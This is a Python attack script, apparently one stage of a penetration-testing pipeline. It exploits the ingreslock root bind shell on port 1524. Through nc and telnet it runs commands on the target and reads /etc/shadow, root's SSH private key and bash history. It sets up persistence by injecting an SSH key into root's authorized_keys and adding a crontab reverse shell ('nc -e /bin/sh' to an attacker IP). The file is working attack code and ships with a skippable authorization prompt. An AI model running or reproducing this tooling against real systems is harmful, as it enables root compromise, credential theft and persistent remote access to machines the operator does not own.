#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
EXPLOIT_JSON = "{target}_backdoor_exploit.json"
EXPLOIT_MD = "{target}_backdoor_exploit.md"

def run_command(cmd: List[str], timeout: int = 180, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def test_backdoor_port_1524(target: str, port: str) -> Tuple[bool, str]:
    """Test for direct root shell on port 1524 (ingreslock backdoor)."""
    # Test connection to port 1524
    telnet_cmd = f"echo 'id' | nc {target} {port}"
    output, success = run_command(telnet_cmd, shell=True, timeout=30)
    if success and ("uid=0" in output or "root" in output):
        logger.info(f"Direct root shell found on port {port}: {target}")
        poc = f"nc {target} {port}"
        return True, poc
    
    # Alternative test with telnet
    telnet_cmd2 = f"echo 'id' | telnet {target} {port}"
    output2, success2 = run_command(telnet_cmd2, shell=True, timeout=30)
    if success2 and ("uid=0" in output2 or "root" in output2):
        logger.info(f"Direct root shell found via telnet on port {port}: {target}")
        poc = f"telnet {target} {port}"
        return True, poc
    
    return False, ""

def test_backdoor_commands(target: str, port: str) -> List[Dict]:
    """Test various commands on the backdoor."""
    results = []
    
    commands = [
        ("id", "User ID check"),
        ("whoami", "Current user"),
        ("uname -a", "System information"),
        ("cat /etc/passwd", "User enumeration"),
        ("ls -la /root", "Root directory listing"),
        ("ps aux", "Process listing")
    ]
    
    for cmd, description in commands:
        test_cmd = f"echo '{cmd}' | nc {target} {port}"
        output, success = run_command(test_cmd, shell=True, timeout=30)
        if success and output.strip():
            results.append({
                "type": f"Backdoor Command: {cmd}",
                "target": f"{target}:{port}",
                "details": f"{description}: {output.strip()[:100]}...",
                "poc": f"echo '{cmd}' | nc {target} {port}"
            })
    
    return results

def test_backdoor_file_access(target: str, port: str) -> List[Dict]:
    """Test file access through the backdoor."""
    results = []
    
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/root/.bash_history",
        "/root/.ssh/id_rsa",
        "/var/log/auth.log"
    ]
    
    for file_path in sensitive_files:
        test_cmd = f"echo 'cat {file_path}' | nc {target} {port}"
        output, success = run_command(test_cmd, shell=True, timeout=30)
        if success and output.strip() and "No such file" not in output:
            results.append({
                "type": f"File Access: {file_path}",
                "target": f"{target}:{port}",
                "details": f"Successfully read {file_path}",
                "poc": f"echo 'cat {file_path}' | nc {target} {port}"
            })
    
    return results

def test_backdoor_privilege_escalation(target: str, port: str) -> Tuple[bool, str]:
    """Test privilege escalation through the backdoor."""
    # Test if we can execute commands as root
    test_cmd = f"echo 'whoami && id' | nc {target} {port}"
    output, success = run_command(test_cmd, shell=True, timeout=30)
    if success and ("root" in output or "uid=0" in output):
        logger.info(f"Root privileges confirmed via backdoor: {target}:{port}")
        poc = f"echo 'whoami && id' | nc {target} {port}"
        return True, poc
    
    return False, ""

def test_backdoor_persistence(target: str, port: str) -> List[Dict]:
    """Test persistence mechanisms through the backdoor."""
    results = []
    
    # Test adding SSH key
    key_test = f"echo 'mkdir -p /root/.ssh && echo \"ssh-rsa test_key\" >> /root/.ssh/authorized_keys' | nc {target} {port}"
    output, success = run_command(key_test, shell=True, timeout=30)
    if success:
        results.append({
            "type": "SSH Key Injection",
            "target": f"{target}:{port}",
            "details": "SSH key added to root authorized_keys",
            "poc": f"echo 'mkdir -p /root/.ssh && echo \"ssh-rsa test_key\" >> /root/.ssh/authorized_keys' | nc {target} {port}"
        })
    
    # Test adding cron job
    cron_test = f"echo 'echo \"* * * * * nc -e /bin/sh 192.168.1.16 4444\" >> /etc/crontab' | nc {target} {port}"
    output, success = run_command(cron_test, shell=True, timeout=30)
    if success:
        results.append({
            "type": "Cron Job Persistence",
            "target": f"{target}:{port}",
            "details": "Reverse shell cron job added",
            "poc": f"echo 'echo \"* * * * * nc -e /bin/sh 192.168.1.16 4444\" >> /etc/crontab' | nc {target} {port}"
        })
    
    return results

def test_backdoor_network_access(target: str, port: str) -> List[Dict]:
    """Test network access through the backdoor."""
    results = []
    
    # Test network connectivity
    network_tests = [
        ("ifconfig", "Network interfaces"),
        ("netstat -tuln", "Listening ports"),
        ("route -n", "Routing table"),
        ("arp -a", "ARP table")
    ]
    
    for cmd, description in network_tests:
        test_cmd = f"echo '{cmd}' | nc {target} {port}"
        output, success = run_command(test_cmd, shell=True, timeout=30)
        if success and output.strip():
            results.append({
                "type": f"Network Info: {description}",
                "target": f"{target}:{port}",
                "details": f"{description} retrieved",
                "poc": f"echo '{cmd}' | nc {target} {port}"
            })
    
    return results

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# Backdoor Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    
    # Filter out non-exploit entries
    actual_exploits = [exp for exp in exploits if 'type' in exp]
    failed_attempts = [exp for exp in exploits if 'failed_attempts' in exp]
    
    for exploit in actual_exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
    
    # Add failed attempts section
    if failed_attempts:
        lines.append("## Failed Attempts\n")
        for failed in failed_attempts:
            for attempt in failed.get("failed_attempts", []):
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str) -> List[Dict]:
    """Exploit backdoor vulnerabilities to gain access."""
    exploits = []
    failed_attempts = []

    logger.info(f"Starting backdoor exploitation on {target}:{port}")

    # Test direct root shell
    logger.info("Testing direct root shell...")
    shell_success, shell_poc = test_backdoor_port_1524(target, port)
    if shell_success:
        exploits.append({
            "type": "Direct Root Shell",
            "target": f"{target}:{port}",
            "details": "CRITICAL: Direct root shell access via backdoor",
            "poc": shell_poc
        })

    # Test privilege escalation
    logger.info("Testing privilege escalation...")
    priv_success, priv_poc = test_backdoor_privilege_escalation(target, port)
    if priv_success:
        exploits.append({
            "type": "Privilege Escalation",
            "target": f"{target}:{port}",
            "details": "Root privileges confirmed",
            "poc": priv_poc
        })

    # Test backdoor commands
    logger.info("Testing backdoor commands...")
    cmd_results = test_backdoor_commands(target, port)
    exploits.extend(cmd_results)

    # Test file access
    logger.info("Testing file access...")
    file_results = test_backdoor_file_access(target, port)
    exploits.extend(file_results)

    # Test persistence mechanisms
    logger.info("Testing persistence mechanisms...")
    persist_results = test_backdoor_persistence(target, port)
    exploits.extend(persist_results)

    # Test network access
    logger.info("Testing network access...")
    network_results = test_backdoor_network_access(target, port)
    exploits.extend(network_results)

    # Add failed attempts
    if failed_attempts:
        exploits.append({"failed_attempts": failed_attempts})

    logger.info(f"Backdoor exploitation completed. Found {len([e for e in exploits if 'type' in e])} exploits.")
    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first backdoor metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_bindshell_*_metadata.json"))
    if not metadata_files:
        logger.error(f"No backdoor metadata files found for {target}.")
        return None, ""
    
    metadata_file = metadata_files[0]
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            data = json.load(f)
        port = data.get("port", "1524")
        logger.info(f"Found metadata file: {metadata_file}")
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploitation."""
    parser = argparse.ArgumentParser(description="Backdoor Exploitation Script")
    parser.add_argument("target", help="Target domain or IP")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["nc", "telnet", "python3"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it.")
            sys.exit(1)

    # Find metadata file
    metadata_file, port = find_metadata_file(args.target)
    if not metadata_file:
        logger.error("No metadata file found. Run recon.py first.")
        sys.exit(1)

    # Load metadata
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except Exception as e:
        logger.error(f"Error loading metadata: {e}")
        sys.exit(1)

    # Run exploitation
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port)

    # Save results
    save_exploit_report(exploits, args.target, port)
    logger.info("Exploitation complete.")

if __name__ == "__main__":
    main() 